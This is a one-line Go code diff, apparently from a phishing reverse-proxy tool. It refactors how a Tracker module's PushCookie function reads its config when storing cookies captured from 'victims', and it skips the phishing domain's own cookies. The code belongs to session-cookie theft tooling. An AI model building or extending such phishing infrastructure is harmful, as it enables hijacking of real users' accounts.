@@ -134,7 +134,7 @@ func (module *Tracker) PushVictim(v *db.Victim) {
 // PushCookie stores a Cookie in the database. If the cookie exists, it will be overridden
 func (module *Tracker) PushCookie(victim *db.Victim, cookie db.VictimCookie) {
 
-	if cookie.Domain == module.Session.Config.Proxy.Phishing {
+	if cookie.Domain == module.Session.Config().Proxy.Phishing {
 		return
 	}
 
